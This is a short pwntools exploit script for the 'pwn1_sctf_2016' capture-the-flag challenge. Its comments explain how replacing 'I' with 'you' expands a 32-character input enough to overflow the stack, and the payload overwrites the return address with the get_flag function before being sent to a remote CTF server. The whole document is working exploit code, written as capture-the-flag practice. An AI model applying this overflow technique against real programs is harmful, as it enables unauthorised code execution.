from pwn import *

# the max input length was limit by 32, 
# but padding to make overflow need 0x3c+0x4 characters, 
# but if our input is 'I', the program will replace 'I' to 'you',
# so we just need input (0x3c+0x4)/3 'I' and 1 'a'(or any character except 'I')

context.arch = 'i386'

# p= process('./pwn1_sctf_2016')
p = remote('node3.buuoj.cn',26328)

payload = 'I'*((0x3c+0x4)//3) + 'A' + p32(ELF('./pwn1_sctf_2016').sym['get_flag'])
p.sendline(payload)
print p.recv()
